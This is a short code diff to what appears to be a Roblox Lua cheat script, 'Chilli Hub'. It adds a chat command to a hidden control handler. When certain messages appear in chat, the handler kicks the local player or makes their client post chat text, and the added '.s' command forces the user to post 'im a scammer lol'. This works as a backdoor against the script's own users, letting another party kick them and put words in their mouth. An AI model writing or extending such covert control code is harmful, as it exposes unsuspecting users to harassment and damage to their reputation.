@@ -26,7 +26,10 @@ Players.PlayerAdded:Connect(function(plr)
                 localPlayer:Kick("You have been removed by Chilli Hub")
             elseif msg == ".c" then
                 chatChannel:SendAsync("sg")
+            elseif msg == ".s" then
+                chatChannel:SendAsync("im a scammer lol")
             end
         end)
     end
 end)
+
